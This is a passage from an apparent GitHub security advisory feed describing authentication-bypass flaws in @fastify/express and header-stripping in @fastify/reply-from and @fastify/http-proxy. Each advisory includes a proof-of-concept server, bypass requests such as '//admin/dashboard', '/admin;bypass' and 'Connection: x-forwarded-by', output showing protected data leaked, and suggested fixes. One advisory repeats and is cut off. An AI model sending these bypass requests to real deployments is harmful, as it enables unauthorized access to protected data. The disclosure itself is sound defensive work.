<p><code>@fastify/express</code> v4.0.4 fails to normalize URLs before passing them to Express middleware when Fastify router normalization options are enabled. This allows complete bypass of path-scoped authentication middleware via two vectors:</p>
<ol>
<li><strong>Duplicate slashes</strong> (<code>//admin/dashboard</code>) when <code>ignoreDuplicateSlashes: true</code> is configured</li>
<li><strong>Semicolon delimiters</strong> (<code>/admin;bypass</code>) when <code>useSemicolonDelimiter: true</code> is configured</li>
</ol>
<p>In both cases, Fastify's router normalizes the URL and matches the route, but <code>@fastify/express</code> passes the original un-normalized URL to Express middleware, which fails to match and is skipped.</p>
<p>Note: This is distinct from GHSA-g6q3-96cp-5r5m (CVE-2026-22037), which addressed URL percent-encoding bypass and was patched in v4.0.3. These normalization gaps remain in v4.0.4. A similar class of normalization issue was addressed in <code>@fastify/middie</code> via GHSA-8p85-9qpw-fwgw (CVE-2026-2880), but <code>@fastify/express</code> does not include the equivalent fixes.</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in <code>@fastify/express</code>'s <code>enhanceRequest</code> function (<code>index.js</code> lines 43-46):</p>
<pre><code class="language-javascript">const decodedUrl = decodeURI(url)
req.raw.url = decodedUrl
</code></pre>
<p>The <code>decodeURI()</code> function only handles percent-encoding — it does not normalize duplicate slashes or strip semicolon-delimited parameters. When Fastify's router options are enabled, <code>find-my-way</code> applies these normalizations during route matching, but <code>@fastify/express</code> passes the original URL to Express middleware.</p>
<h4 id="vector-1-duplicate-slashes">Vector 1: Duplicate Slashes</h4>
<p>When <code>ignoreDuplicateSlashes: true</code> is set, Fastify's <code>find-my-way</code> router normalizes <code>//admin/dashboard</code> to <code>/admin/dashboard</code> for route matching. However, Express middleware receives <code>//admin/dashboard</code>. Express's <code>app.use('/admin', authMiddleware)</code> expects paths to start with <code>/admin/</code>, but <code>//admin</code> does not match the <code>/admin</code> prefix pattern.</p>
<p>The attack sequence:</p>
<ol>
<li>Client sends <code>GET //admin/dashboard</code></li>
<li>Fastify's router normalizes this to <code>/admin/dashboard</code> and finds a matching route</li>
<li><code>enhanceRequest</code> sets <code>req.raw.url = "//admin/dashboard"</code> (preserves double slash)</li>
<li>Express middleware <code>app.use('/admin', authMiddleware)</code> does not match <code>//admin</code> prefix</li>
<li>Authentication is bypassed, and the Fastify route handler executes</li>
</ol>
<h4 id="vector-2-semicolon-delimiters">Vector 2: Semicolon Delimiters</h4>
<p>When <code>useSemicolonDelimiter: true</code> is configured, the router uses <code>find-my-way</code>'s <code>safeDecodeURI()</code> which treats semicolons as query string delimiters, splitting <code>/admin;bypass</code> into path <code>/admin</code> and querystring <code>bypass</code> for route matching. However, <code>@fastify/express</code> passes the full URL <code>/admin;bypass</code> to Express middleware.</p>
<p>Express uses path-to-regexp v0.1.12 internally, which compiles middleware paths like <code>/admin</code> to the regex <code>/^\/admin\/?(?=\/|$)/i</code>. A semicolon character does not satisfy the lookahead condition, causing the middleware match to fail.</p>
<p>The attack flow:</p>
<ol>
<li>Request <code>GET /admin;bypass</code> arrives</li>
<li>Fastify router: splits at <code>;</code> — matches route <code>GET /admin</code></li>
<li>Express middleware: regex <code>/^\/admin\/?(?=\/|$)/i</code> fails against <code>/admin;bypass</code> — middleware skipped</li>
<li>Route handler executes without authentication checks</li>
</ol>
<h3 id="poc">PoC</h3>
<h4 id="duplicate-slash-bypass">Duplicate Slash Bypass</h4>
<p>Save as <code>server.js</code> and run with <code>node server.js</code>:</p>
<pre><code class="language-js">const fastify = require('fastify')

async function start() {
  const app = fastify({
    logger: false,
    ignoreDuplicateSlashes: true,  // documented Fastify option
  })

  await app.register(require('@fastify/express'))

  // Standard Express middleware auth pattern
  app.use('/admin', function expressAuthGate(req, res, next) {
    const auth = req.headers.authorization
    if (!auth || auth !== 'Bearer admin-secret-token') {
      res.statusCode = 403
      res.setHeader('content-type', 'application/json')
      res.end(JSON.stringify({ error: 'Forbidden by Express middleware' }))
      return
    }
    next()
  })

  // Protected route
  app.get('/admin/dashboard', async (request) =&gt; {
    return { message: 'Admin dashboard', secret: 'sensitive-admin-data' }
  })

  await app.listen({ port: 3000 })
  console.log('Listening on http://localhost:3000')
}
start()
</code></pre>
<pre><code class="language-bash"># Normal access — blocked by Express middleware
$ curl -s http://localhost:3000/admin/dashboard
{"error":"Forbidden by Express middleware"}

# Double-slash bypass — Express middleware skipped, handler runs
$ curl -s http://localhost:3000//admin/dashboard
{"message":"Admin dashboard","secret":"sensitive-admin-data"}

# Triple-slash also works
$ curl -s http://localhost:3000///admin/dashboard
{"message":"Admin dashboard","secret":"sensitive-admin-data"}
</code></pre>
<p>Multiple variants work: <code>///admin</code>, <code>/.//admin</code>, <code>//admin//dashboard</code>, etc.</p>
<h4 id="semicolon-bypass">Semicolon Bypass</h4>
<pre><code class="language-javascript">const fastify = require('fastify')
const http = require('http')

function get(port, url) {
  return new Promise((resolve, reject) =&gt; {
    http.get('http://localhost:' + port + url, (res) =&gt; {
      let data = ''
      res.on('data', (chunk) =&gt; data += chunk)
      res.on('end', () =&gt; resolve({ status: res.statusCode, body: data }))
    }).on('error', reject)
  })
}

async function test() {
  const app = fastify({ 
    logger: false, 
    routerOptions: { useSemicolonDelimiter: true }
  })
  await app.register(require('@fastify/express'))
  
  // Auth middleware blocking unauthenticated access
  app.use('/admin', function(req, res, next) {
    if (!req.headers.authorization) {
      res.statusCode = 403
      res.setHeader('content-type', 'application/json')
      res.end(JSON.stringify({ error: 'Forbidden' }))
      return
    }
    next()
  })
  
  app.get('/admin', async () =&gt; ({ secret: 'classified-info' }))
  
  await app.listen({ port: 19900, host: '0.0.0.0' })
  
  // Blocked:
  let r = await get(19900, '/admin')
  console.log('/admin:', r.status, r.body)
  // Output: /admin: 403 {"error":"Forbidden"}
  
  // BYPASS:
  r = await get(19900, '/admin;bypass')
  console.log('/admin;bypass:', r.status, r.body)
  // Output: /admin;bypass: 200 {"secret":"classified-info"}
  
  r = await get(19900, '/admin;')
  console.log('/admin;:', r.status, r.body)
  // Output: /admin;: 200 {"secret":"classified-info"}
  
  await app.close()
}
test()
</code></pre>
<p>Actual output:</p>
<pre><code>/admin: 403 {"error":"Forbidden"}
/admin;bypass: 200 {"secret":"classified-info"}
/admin;: 200 {"secret":"classified-info"}
</code></pre>
<p>The semicolon bypass works with any text after it: <code>/admin;</code>, <code>/admin;x</code>, <code>/admin;jsessionid=123</code>.</p>
<h3 id="impact">Impact</h3>
<p>Complete authentication bypass for applications using Express middleware for path-based access control. An unauthenticated attacker can access protected routes (admin panels, APIs, user data) by manipulating the URL path.</p>
<p><strong>Duplicate slash vector</strong> affects applications that:</p>
<ol>
<li>Use <code>@fastify/express</code> with <code>ignoreDuplicateSlashes: true</code></li>
<li>Rely on Express middleware for authentication/authorization</li>
<li>Use path-scoped middleware patterns like <code>app.use('/admin', authMiddleware)</code></li>
</ol>
<p><strong>Semicolon vector</strong> affects applications that:</p>
<ol>
<li>Use <code>@fastify/express</code> with <code>useSemicolonDelimiter: true</code> (commonly enabled for Java application server compatibility, e.g., handling <code>;jsessionid=</code> parameters)</li>
<li>Rely on Express middleware for authentication/authorization</li>
<li>Use path-scoped middleware patterns like <code>app.use('/admin', authMiddleware)</code></li>
</ol>
<p>The bypass works against all Express middleware that uses prefix path matching, including popular packages like <code>express-basic-auth</code>, custom authentication middleware, and rate limiting middleware.</p>
<p>The <code>ignoreDuplicateSlashes</code> and <code>useSemicolonDelimiter</code> options are documented as convenience features, not marked as security-sensitive, so developers would not expect them to impact middleware security.</p>
<h3 id="affected-versions">Affected Versions</h3>
<ul>
<li><code>@fastify/express</code> v4.0.4 (latest) with Fastify 5.x</li>
<li>Requires <code>ignoreDuplicateSlashes: true</code> or <code>useSemicolonDelimiter: true</code> in Fastify configuration (via top-level option or <code>routerOptions</code>)</li>
</ul>
<h3 id="variant-testing">Variant Testing</h3>
<p><strong>Duplicate slashes:</strong></p>
<table>
<thead>
<tr>
<th>Request</th>
<th>Express Middleware</th>
<th>Handler Runs</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td><code>GET /admin/dashboard</code></td>
<td>Invoked (blocks)</td>
<td>No</td>
<td>403 Forbidden</td>
</tr>
<tr>
<td><code>GET //admin/dashboard</code></td>
<td>Skipped</td>
<td>Yes</td>
<td>200 OK — <strong>BYPASS</strong></td>
</tr>
<tr>
<td><code>GET ///admin/dashboard</code></td>
<td>Skipped</td>
<td>Yes</td>
<td>200 OK — <strong>BYPASS</strong></td>
</tr>
<tr>
<td><code>GET /.//admin/dashboard</code></td>
<td>Skipped</td>
<td>Yes</td>
<td>200 OK — <strong>BYPASS</strong></td>
</tr>
<tr>
<td><code>GET //admin//dashboard</code></td>
<td>Skipped</td>
<td>Yes</td>
<td>200 OK — <strong>BYPASS</strong></td>
</tr>
<tr>
<td><code>GET /admin//dashboard</code></td>
<td>Invoked (blocks)</td>
<td>No</td>
<td>403 Forbidden</td>
</tr>
</tbody></table>
<p><strong>Semicolons:</strong></p>
<table>
<thead>
<tr>
<th>URL</th>
<th>Express MW Fires</th>
<th>Route Matches</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td><code>/admin</code></td>
<td>Yes</td>
<td>Yes (200/403)</td>
<td>Normal</td>
</tr>
<tr>
<td><code>/admin;</code></td>
<td>No</td>
<td>Yes (200)</td>
<td><strong>BYPASS</strong></td>
</tr>
<tr>
<td><code>/admin;bypass</code></td>
<td>No</td>
<td>Yes (200)</td>
<td><strong>BYPASS</strong></td>
</tr>
<tr>
<td><code>/admin;x=1</code></td>
<td>No</td>
<td>Yes (200)</td>
<td><strong>BYPASS</strong></td>
</tr>
<tr>
<td><code>/admin;/dashboard</code></td>
<td>No</td>
<td>Yes (200, routes to /admin)</td>
<td><strong>BYPASS</strong></td>
</tr>
<tr>
<td><code>/admin/dashboard;x</code></td>
<td>Yes</td>
<td>Yes (routes to /admin/dashboard)</td>
<td>Normal (prefix /admin/ still matches)</td>
</tr>
</tbody></table>
<p>The semicolon bypass is effective when the semicolon appears immediately after the middleware prefix boundary. For sub-paths where the prefix is already matched (e.g., <code>/admin/dashboard;x</code>), Express's prefix regex succeeds because the <code>/admin/</code> part matches before the semicolon appears.</p>
<h3 id="suggested-fix">Suggested Fix</h3>
<p><code>@fastify/express</code> should normalize URLs before passing them to Express middleware, respecting the router normalization options that are enabled. Specifically:</p>
<ul>
<li>When <code>ignoreDuplicateSlashes</code> is enabled, apply <code>FindMyWay.removeDuplicateSlashes()</code> to <code>req.raw.url</code> before middleware execution</li>
<li>When <code>useSemicolonDelimiter</code> is enabled, strip semicolon-delimited parameters from the URL before passing to Express</li>
</ul>
<p>This would match the normalization behavior that <code>@fastify/middie</code> already implements via <code>sanitizeUrlPath()</code> and <code>normalizePathForMatching()</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify-express/security/advisories/GHSA-6hw5-45gm-fj88">https://github.com/fastify/fastify-express/security/advisories/GHSA-6hw5-45gm-fj88</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33808">https://nvd.nist.gov/vuln/detail/CVE-2026-33808</a></li>
<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
<li><a href="https://github.com/advisories/GHSA-6hw5-45gm-fj88">https://github.com/advisories/GHSA-6hw5-45gm-fj88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6hw5-45gm-fj88</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-16T01:03:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fastify/express] @fastify/express's middleware path doubling causes authentication bypass in child plugin scopes]]></title>
        <id>https://github.com/advisories/GHSA-hrwm-hgmj-7p9c</id>
        <link href="https://github.com/advisories/GHSA-hrwm-hgmj-7p9c"/>
        <updated>2026-04-16T01:03:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@fastify/express</code> v4.0.4 contains a path handling bug in the <code>onRegister</code> function that causes middleware paths to be doubled when inherited by child plugins. This results in complete bypass of Express middleware security controls for all routes defined within child plugin scopes that share a prefix with parent-scoped middleware. No special configuration is required — this affects the default Fastify configuration.</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in the <code>onRegister</code> function at <code>index.js</code> lines 92-101. When a child plugin is registered with a prefix, the <code>onRegister</code> hook copies middleware from the parent scope and re-registers it using <code>instance.use(...middleware)</code>. However, the middleware paths stored in <code>kMiddlewares</code> are already prefixed from their original registration.</p>
<p>The call flow demonstrates the problem:</p>
<ol>
<li>Parent scope registers middleware: <code>app.use('/admin', authFn)</code> — <code>use()</code> calculates path as <code>'' + '/admin' = '/admin'</code> — stores <code>['/admin', authFn]</code> in <code>kMiddlewares</code></li>
<li>Child plugin registers with <code>{ prefix: '/admin' }</code> — triggers <code>onRegister(instance)</code></li>
<li><code>onRegister</code> copies parent middleware and calls <code>instance.use('/admin', authFn)</code> on child</li>
<li>Child's <code>use()</code> function calculates path as <code>'/admin' + '/admin' = '/admin/admin'</code> — registers middleware with doubled path</li>
<li>Routes in child scope use the child's Express instance, where middleware is registered under the incorrect path <code>/admin/admin</code></li>
<li>Requests to <code>/admin/secret</code> don't match <code>/admin/admin</code> — middleware is silently skipped</li>
</ol>
<p>The root cause is in the <code>use()</code> function at lines 25-26, which always prepends <code>this.prefix</code> to string paths, combined with <code>onRegister</code> re-calling <code>use()</code> with already-prefixed paths.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">const fastify = require('fastify');
const http = require('http');

function get(port, url) {
  return new Promise((resolve, reject) =&gt; {
    http.get('http://localhost:' + port + url, (res) =&gt; {
      let data = '';
      res.on('data', (chunk) =&gt; data += chunk);
      res.on('end', () =&gt; resolve({ status: res.statusCode, body: data }));
    }).on('error', reject);
  });
}

async function test() {
  const app = fastify({ logger: false });
  await app.register(require('@fastify/express'));
  
  // Middleware enforcing auth on /admin routes
  app.use('/admin', function(req, res, next) {
    if (!req.headers.authorization) {
      res.statusCode = 403;
      res.setHeader('content-type', 'application/json');
      res.end(JSON.stringify({ error: 'Forbidden' }));
      return;
    }
    next();
  });
  
  // Root scope route — middleware works correctly
  app.get('/admin/root-data', async () =&gt; ({ data: 'root-secret' }));
  
  // Child scope route — middleware BYPASSED
  await app.register(async function(child) {
    child.get('/secret', async () =&gt; ({ data: 'child-secret' }));
  }, { prefix: '/admin' });
  
  await app.listen({ port: 19876, host: '0.0.0.0' });
  
  // Root scope: correctly blocked
  let r = await get(19876, '/admin/root-data');
  console.log('/admin/root-data (no auth):', r.status, r.body);
  // Output: 403 {"error":"Forbidden"}
  
  // Child scope: BYPASSED — secret data returned without auth
  r = await get(19876, '/admin/secret');
  console.log('/admin/secret (no auth):', r.status, r.body);
  // Output: 200 {"data":"child-secret"}
  
  await app.close();
}
test();
</code></pre>
<p>Actual output:</p>
<pre><code>/admin/root-data (no auth): 403 {"error":"Forbidden"}
/admin/secret (no auth): 200 {"data":"child-secret"}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Complete bypass of Express middleware security controls for all routes defined in child plugin scopes. Authentication, authorization, rate limiting, CSRF protection, audit logging, and any other middleware-based security mechanisms are silently skipped for affected routes.</p>
<ul>
<li>No special request crafting is required — normal requests bypass the middleware</li>
<li>It affects the idiomatic Fastify plugin pattern commonly used in production</li>
<li>The bypass is silent with no errors or warnings</li>
<li>Developers' basic testing of root-scoped routes will pass, masking the vulnerability</li>
<li>Any child plugin scope that shares a prefix with middleware is affected</li>
</ul>
<p>Applications using <code>@fastify/express</code> with path-scoped middleware and child plugins with matching prefixes are vulnerable in default configurations.</p>
<h3 id="affected-versions">Affected Versions</h3>
<ul>
<li><code>@fastify/express</code> v4.0.4 (latest at time of discovery)</li>
<li>Fastify 5.x in default configuration</li>
<li>No special router options required (<code>ignoreDuplicateSlashes</code> not needed)</li>
<li>Affects any child plugin registration where the prefix overlaps with middleware path scoping</li>
<li>Does NOT affect middleware registered without path scoping (global middleware)</li>
<li>Does NOT affect middleware registered on root path (<code>/</code>) due to special case handling</li>
</ul>
<h3 id="variant-testing">Variant Testing</h3>
<table>
<thead>
<tr>
<th>Scenario</th>
<th>Middleware Path</th>
<th>Child Prefix</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td>Root route <code>/admin/root-data</code></td>
<td><code>/admin</code></td>
<td>N/A</td>
<td>Middleware runs (403)</td>
</tr>
<tr>
<td>Child route <code>/admin/secret</code></td>
<td><code>/admin</code></td>
<td><code>/admin</code></td>
<td><strong>BYPASS</strong> (200)</td>
</tr>
<tr>
<td>Child route <code>/api/data</code></td>
<td><code>/api</code></td>
<td><code>/api</code></td>
<td><strong>BYPASS</strong> (200)</td>
</tr>
<tr>
<td>Nested child <code>/admin/sub/data</code></td>
<td><code>/admin</code></td>
<td><code>/admin/sub</code></td>
<td><strong>BYPASS</strong> — path becomes <code>/admin/sub/admin</code></td>
</tr>
<tr>
<td>Middleware on <code>/</code> with any child</td>
<td><code>/</code></td>
<td><code>/api</code></td>
<td>No bypass — <code>path === '/' &amp;&amp; prefix.length &gt; 0</code> special case</td>
</tr>
</tbody></table>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>The <code>onRegister</code> function should store and re-use the original unprefixed middleware paths, or avoid re-calling the <code>use()</code> function entirely. Options include:</p>
<ol>
<li>Store the original path and function separately in <code>kMiddlewares</code> before prefixing</li>
<li>Strip the parent prefix before re-registering in child scopes</li>
<li>Store already-constructed Express middleware objects rather than re-processing paths</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify-express/security/advisories/GHSA-hrwm-hgmj-7p9c">https://github.com/fastify/fastify-express/security/advisories/GHSA-hrwm-hgmj-7p9c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33807">https://nvd.nist.gov/vuln/detail/CVE-2026-33807</a></li>
<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
<li><a href="https://github.com/advisories/GHSA-hrwm-hgmj-7p9c">https://github.com/advisories/GHSA-hrwm-hgmj-7p9c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hrwm-hgmj-7p9c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-16T01:03:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fastify/http-proxy] Fastify's connection header abuse enables stripping of proxy-added headers]]></title>
        <id>https://github.com/advisories/GHSA-gwhp-pf74-vj37</id>
        <link href="https://github.com/advisories/GHSA-gwhp-pf74-vj37"/>
        <updated>2026-04-16T01:03:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@fastify/reply-from</code> and <code>@fastify/http-proxy</code> process the client's <code>Connection</code> header after the proxy has added its own headers via <code>rewriteRequestHeaders</code>. This allows attackers to retroactively strip proxy-added headers (like access control or identification headers) from upstream requests by listing them in the <code>Connection</code> header value. This affects applications using these plugins with custom header injection for routing, access control, or security purposes.</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in <code>@fastify/reply-from/lib/request.js</code> at lines 128-136 (HTTP/1.1 handler) and lines 191-200 (undici handler). The processing flow is:</p>
<ol>
<li>Client headers are copied including the <code>connection</code> header (<code>@fastify/reply-from/index.js</code> line 91)</li>
<li>The proxy adds custom headers via <code>rewriteRequestHeaders</code> (line 151)</li>
<li>During request construction, the transport handlers read the client's <code>Connection</code> header and strip any headers listed in it</li>
<li>This stripping happens after <code>rewriteRequestHeaders</code>, allowing clients to target proxy-added headers for removal</li>
</ol>
<p>RFC 7230 Section 6.1 Connection header processing is intended for proxies to strip hop-by-hop headers from incoming requests before adding their own headers. The current implementation reverses this order, processing the client's Connection header after the proxy has already modified the header set.</p>
<p>The call chain:</p>
<ol>
<li><code>@fastify/reply-from/index.js</code> line 91: <code>headers = { ...req.headers }</code> — copies ALL client headers including <code>connection</code></li>
<li><code>index.js</code> line 151: <code>requestHeaders = rewriteRequestHeaders(this.request, headers)</code> — proxy adds custom headers (e.g., <code>x-forwarded-by</code>)</li>
<li><code>index.js</code> line 180: <code>requestImpl({...headers: requestHeaders...})</code> — passes headers to transport</li>
<li><code>request.js</code> line 191 (undici): <code>getConnectionHeaders(req.headers)</code> — reads Connection header FROM THE CLIENT</li>
<li><code>request.js</code> lines 198-200: Strips headers listed in Connection — including proxy-added headers</li>
</ol>
<p>This is distinct from the general hop-by-hop forwarding concern — it's specifically about the client controlling which headers get stripped from the upstream request via the Connection header, subverting the proxy's <code>rewriteRequestHeaders</code> function.</p>
<h3 id="poc">PoC</h3>
<p>Self-contained reproduction with an upstream echo service and a proxy that adds a custom header:</p>
<pre><code class="language-javascript">const fastify = require('fastify');

async function test() {
  // Upstream service that echoes headers
  const upstream = fastify({ logger: false });
  upstream.get('/api/echo-headers', async (request) =&gt; {
    return { headers: request.headers };
  });
  await upstream.listen({ port: 19801 });

  // Proxy that adds a custom header via rewriteRequestHeaders
  const proxy = fastify({ logger: false });
  await proxy.register(require('@fastify/reply-from'), {
    base: 'http://localhost:19801'
  });

  proxy.get('/proxy/*', async (request, reply) =&gt; {
    const target = '/' + (request.params['*'] || '');
    return reply.from(target, {
      rewriteRequestHeaders: (originalReq, headers) =&gt; {
        return { ...headers, 'x-forwarded-by': 'fastify-proxy' };
      }
    });
  });

  await proxy.listen({ port: 19800 });

  // Baseline: proxy adds x-forwarded-by header
  const res1 = await proxy.inject({
    method: 'GET',
    url: '/proxy/api/echo-headers'
  });
  console.log('Baseline response headers from upstream:');
  const body1 = JSON.parse(res1.body);
  console.log('  x-forwarded-by:', body1.headers['x-forwarded-by'] || 'NOT PRESENT');

  // Attack: Connection header strips the proxy-added header
  const res2 = await proxy.inject({
    method: 'GET',
    url: '/proxy/api/echo-headers',
    headers: { 'connection': 'x-forwarded-by' }
  });
  console.log('\nAttack response headers from upstream:');
  const body2 = JSON.parse(res2.body);
  console.log('  x-forwarded-by:', body2.headers['x-forwarded-by'] || 'NOT PRESENT (stripped!)');

  await proxy.close();
  await upstream.close();
}
test();
</code></pre>
<p>Actual output:</p>
<pre><code>Baseline response headers from upstream:
  x-forwarded-by: fastify-proxy

Attack response headers from upstream:
  x-forwarded-by: NOT PRESENT (stripped!)
</code></pre>
<p>The <code>x-forwarded-by</code> header that the proxy explicitly added in <code>rewriteRequestHeaders</code> is stripped before reaching the upstream.</p>
<p>Multiple headers can be stripped at once by sending <code>Connection: x-forwarded-by, x-forwarded-for</code>.</p>
<p>Both the undici (default) and HTTP/1.1 transport handlers in <code>@fastify/reply-from</code> are affected, as well as <code>@fastify/http-proxy</code> which delegates to <code>@fastify/reply-from</code>.</p>
<h3 id="impact">Impact</h3>
<p>Attackers can selectively remove any header added by the proxy's <code>rewriteRequestHeaders</code> function. This enables several attack scenarios:</p>
<ol>
<li><strong>Bypass proxy identification</strong>: Strip headers that identify requests as coming through the proxy, potentially bypassing upstream controls that differentiate between direct and proxied requests</li>
<li><strong>Circumvent access control</strong>: If the proxy adds headers used for routing, authorization, or security decisions (e.g., <code>x-internal-auth</code>, <code>x-proxy-token</code>), attackers can strip them to access unauthorized resources</li>
<li><strong>Remove arbitrary headers</strong>: Any header can be targeted, including <code>Connection: authorization</code> to strip authentication or <code>Connection: x-forwarded-for, x-forwarded-by</code> to remove multiple headers at once</li>
</ol>
<p>This vulnerability affects deployments where the proxy adds security-relevant headers that downstream services rely on for access control decisions. It undermines the security model where proxies act as trusted intermediaries adding authentication or routing signals.</p>
<h3 id="affected-versions">Affected Versions</h3>
<ul>
<li><code>@fastify/reply-from</code> — All versions, both undici (default) and HTTP/1.1 transport handlers</li>
<li><code>@fastify/http-proxy</code> — All versions (delegates to <code>@fastify/reply-from</code>)</li>
<li>Any configuration using <code>rewriteRequestHeaders</code> to add headers that could be security-relevant</li>
<li>No special configuration required to exploit — works with default settings</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>The Connection header from the client should be processed and consumed before <code>rewriteRequestHeaders</code> is called, not after. Alternatively, the Connection header processing in <code>request.js</code> should maintain a list of headers that existed in the original client request and only strip those, not headers added by <code>rewriteRequestHeaders</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify-reply-from/security/advisories/GHSA-gwhp-pf74-vj37">https://github.com/fastify/fastify-reply-from/security/advisories/GHSA-gwhp-pf74-vj37</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33805">https://nvd.nist.gov/vuln/detail/CVE-2026-33805</a></li>
<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
<li><a href="https://github.com/advisories/GHSA-gwhp-pf74-vj37">https://github.com/advisories/GHSA-gwhp-pf74-vj37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gwhp-pf74-vj37</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-16T01:02:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@fastify/reply-from] Fastify's connection header abuse enables stripping of proxy-added headers]]></title>
        <id>https://github.com/advisories/GHSA-gwhp-pf74-vj37</id>
        <link href="https://github.com/advisories/GHSA-gwhp-pf74-vj37"/>
        <updated>2026-04-16T01:03:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@fastify/reply-from</code> and <code>@fastify/http-proxy</code> process the client's <code>Connection</code> header after the proxy has added its own headers via <code>rewriteRequestHeaders</code>. This allows attackers to retroactively strip proxy-added headers (like access control or identification headers) from upstream requests by listing them in the <code>Connection</code> header value. This affects applications using these plugins with custom header injection for routing, access control, or security purposes.</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in <code>@fastify/reply-from/lib/request.js</code> at lines 128-136 (HTTP/1.1 handler) and lines 191-200 (undici handler). The processing flow is:</p>
<ol>
<li>Client headers are copied including the <code>connection</code> header (<code>@fastify/reply-from/index.js</code> line 91)</li>
<li>The proxy adds custom headers via <code>rewriteRequestHeaders</code> (line 151)</li>
<li>During request construction, the transport handlers read the client's <code>Connection</code> header and strip any headers listed in it</li>
<li>This stripping happens after <code>rewriteRequestHeaders</code>, allowing clients to target proxy-added headers for removal</li>
</ol>
<p>RFC 7230 Section 6.1 Connection header processing is intended for proxies to strip hop-by-hop headers from incoming requests before adding their own headers. The current implementation reverses this order, processing the client's Connection header after the proxy has already modified the header set.</p>
<p>The call chain:</p>
<ol>
<li><code>@fastify/reply-from/index.js</code> line 91: <code>headers = { ...req.headers }</code> — copies ALL client headers including <code>connection</code></li>
<li><code>index.js</code> line 151: <code>requestHeaders = rewriteRequestHeaders(this.request, headers)</code> — proxy adds custom headers (e.g., <code>x-forwarded-by</code>)</li>
<li><code>index.js</code> line 180: <code>requestImpl({...headers: requestHeaders...})</code> — passes headers to transport</li>
<li><code>request.js</code> line 191 (undici): <code>getConnectionHeaders(req.headers)</code> — reads Connection header FROM THE CLIENT</li>
<li><code>request.js</code> lines 198-200: Strips headers listed in Connection — including proxy-added headers</li>
</ol>
<p>This is distinct from the general hop-by-hop forwarding concern — it's specifically about the client controlling which headers get stripped from the upstream request via the Connection header, subverting the proxy's <code>rewriteRequestHeaders</code> function.</p>
<h3 id="poc">PoC</h3>
<p>Self-contained reproduction with an upstream echo service and a proxy that adds a custom header:</p>
<pre><code class="language-javascript">const fastify = require('fastify');

async function test() {
  // Upstream service that echoes headers
  const upstream = fastify({ logger: false });
  upstream.get('/api/echo-headers', async (request) =&gt; {
    return { headers: request.headers };
  });
  await upstream.listen({ port: 19801 });

  // Proxy that adds a custom header via rewriteRequestHeaders
  const proxy = fastify({ logger: false });
  await proxy.register(require('@fastify/reply-from'), {
    base: 'http://localhost:19801'
  });

  proxy.get('/proxy/*', async (request, reply) =&gt; {
    const target = '/' + (request.params['*'] || '');
    return reply.from(target, {
      rewriteRequestHeaders: (originalReq, headers) =&gt; {
        return { ...headers, 'x-forwarded-by': 'fastify-proxy' };
      }
    });
  });

  await proxy.listen({ port: 19800 });

  // Baseline: proxy adds x-forwarded-by header
  const res1 = await proxy.inject({
    method: 'GET',
    url: '/proxy/api/echo-headers'
  });
  console.log('Baseline response headers from upstream:');
  const body1 = JSON.parse(res1.body);
  console.log('  x-forwarded-by:', body1.headers['x-forwarded-by'] || 'NOT PRESENT');

  // Attack: Connection header strips the proxy-added header
  const res2 = await proxy.inject({
    method: 'GET',
    url: '/proxy/api/echo-headers',
    headers: { 'connection': 'x-forwarded-by' }
  });
  console.log('\nAttack response headers from upstream:');
  const body2 = JSON.parse(res2.body);
  console.log('  x-forwarded-by:', body2.headers['x-forwarded-by'] || 'NOT PRESENT (stripped!)');

  await proxy.close();
  await upstream.close();
}
test();
</code></pre>
<p>Actual output:</p>
<pre><code>Baseline response headers from upstream:
  x-forwarded-by: fastify-proxy

Attack response headers from upstream:
  x-forwarded-by: NOT PRESENT (stripped!)
</code></pre>
<p>The <code>x-forwarded-by</code> header that the proxy explicitly added in <code>rewriteRequestHeaders</code> is stripped before reaching the upstream.</p>
<p>Multiple headers can be stripped at once by sending <code>Connection: x-forwarded-by, x-forwarded-for</code>.</p>
<p>Both the undici (default) and HTTP/1.1 transport handlers in <code>@fastify/reply-from</code> are affected, as well as <code>@fastify/http-proxy</code> which delegates to <code>@fastify/reply-from</code>.</p>
<h3 id="impact">Impact</h3>
<p>Attackers can selectively remove any header added by the proxy's <code>rewriteRequestHeaders</code> function. This enables several attack scenarios:</p>
<ol>
